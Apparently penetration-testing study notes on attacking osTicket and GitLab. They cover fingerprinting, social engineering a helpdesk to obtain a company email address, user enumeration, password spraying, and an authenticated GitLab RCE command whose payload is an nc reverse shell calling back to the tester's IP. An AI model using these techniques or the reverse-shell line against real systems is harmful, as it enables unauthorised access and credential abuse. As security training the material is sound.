# Customer Service Mgmt & Configuration Management

In this section, we will discuss the following technologies:
- osTicket
- Gitlab

## osTicket

osTicket is an open-source support ticketing system. It can be compared to systems such as Jira, OTRS, Request Tracker, and Spiceworks. osTicket can integrate user inquiries from email, phone, and web-based forms into a web interface. osTicket is written in PHP and uses a MySQL backend. It can be installed on Windows or Linux.

**Footprinting/Discovery/Enumeration**

osTicket instance which also shows that a cookie named OSTSESSID was set when visiting the page. Also, most osTicket installs will showcase the osTicket logo with the phrase powered by in front of it in the page's footer. The footer may also contain the words Support Ticket System.

Here we can break down the main functions into the layers:

| 1. User input | 2. Processing | 3. Solution |
|---------------|---------------|-------------|

**User Input**

The core function of osTicket is to inform the company's employees about a problem so that a problem can be solved with the service or other components.For instance, from the osTicket documentation, we can see that only staff and users with administrator privileges can access the admin panel. So if our target company uses this or a similar application, we can cause a problem and "play dumb" and contact the company's staff.

**Processing**

As staff or administrators, they try to reproduce significant errors to find the core of the problem. Processing is finally done internally in an isolated environment that will have very similar settings to the systems in production. Suppose staff and administrators suspect that there is an internal bug that may be affecting the business. In that case, they will go into more detail to uncover possible code errors and address more significant issues.

**Solution**

Depending on the depth of the problem, it is very likely that other staff members from the technical departments will be involved in the email correspondence. This will give us new email addresses to use against the osTicket admin panel (in the worst case) and potential usernames with which we can perform OSINT on or try to apply to other company services.

**Attacking osTicket**

A search for osTicket on exploit-db shows various issues, including remote file inclusion, SQL injection, arbitrary file upload, XSS, etc. osTicket version 1.14.1 suffers from CVE-2020-24881 which was an SSRF vulnerability. If exploited, this type of flaw may be leveraged to gain access to internal resources or perform internal port scanning.


Suppose we find an exposed service such as a company's Slack server or GitLab, which requires a valid company email address to join. Many companies have a support email such as support@<domain>, and emails sent to this are available in online support portals that may range from Zendesk to an internal custom tool. Furthermore, a support portal may assign a temporary internal email address to a new ticket so users can quickly check its status. If we come across a customer support portal during our assessment and can submit a new ticket, we may be able to obtain a valid company email address.

Now, if we log in, we can see information about the ticket and ways to post a reply. If the company set up their helpdesk software to correlate ticket numbers with emails, then any email sent to the email we received when registering, 940288@<domain>, would show up here. With this setup, if we can find an external portal such as a Wiki, chat service (Slack, Mattermost, Rocket.chat), or a Git repository such as GitLab or Bitbucket, we may be able to use this email to register an account and the help desk support portal to receive a sign-up confirmation email.


## Gitlab

GitLab is a web-based Git-repository hosting tool that provides wiki capabilities, issue tracking, and continuous integration and deployment pipeline functionality. It is open-source and originally written in Ruby, but the current technology stack includes Go, Ruby on Rails, and Vue.js.

**Footprinting & Discovery**

The only way to footprint the GitLab version number in use is by browsing to the **/help** page when logged in. If the GitLab instance allows us to register an account, we can log in and browse to this page to confirm the version.

**Enumeration**

The first thing we should try is browsing to **/explore** and see if there are any public projects that may contain something interesting. Public projects can be interesting because we may be able to use them to find out more about the company's infrastructure, find production code that we can find a bug in after a code review, hard-coded credentials, a script or configuration file containing credentials, or other secrets such as an SSH private key or API key.

We can also use the registration form to enumerate valid users

We can check if the application allows us to register an account and, if so, we can go back to /explorer to see if we already have access to more projects while logged in.

### User Enumeration

````
$ ./gitlab_userenum.sh --url http://<domain>:8081/ --userlist users.txt
$ python3 gitlab_userenum.py --url URL --wordlist WORDLIST
````
If we successfully pulled down a large list of users, we could attempt a controlled password spraying attack with weak, common passwords such as Welcome1 or Password123, etc., or try to re-use credentials gathered from other sources such as password dumps from public data breaches.

### Code Execution

**Authenticated Remote Code Execution**

GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution vulnerability due to an issue with ExifTool handling metadata in uploaded image files. This issue was fixed by GitLab rather quickly, but some companies are still likely using a vulnerable version.

````
$ python3 gitlab_rce_auth.py -t http://<domain>:8081 -u <user> -p <password> -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <Our_IP> <Our_Port> >/tmp/f '
````

